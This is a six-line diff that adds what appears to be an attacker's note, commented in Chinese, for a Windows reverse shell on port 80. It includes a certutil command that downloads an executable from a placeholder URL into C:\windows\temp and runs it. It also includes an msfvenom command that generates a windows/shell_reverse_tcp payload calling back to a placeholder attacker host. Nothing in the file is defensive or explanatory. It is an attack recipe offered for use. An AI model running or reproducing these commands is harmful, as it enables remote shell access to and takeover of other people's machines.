@@ -1,0 +1,6 @@
+msf生成的nc可接受的80端口的反向shell，生成命令在注释
+certutil -urlcache -split -f $downloadurl C:\windows\temp\shell80.exe
+C:\windows\temp\shell80.exe
+###
+msfvenom -p windows/shell_reverse_tcp LHOST=$badip LPORT=80 -f exe -o shell80.exe
+###
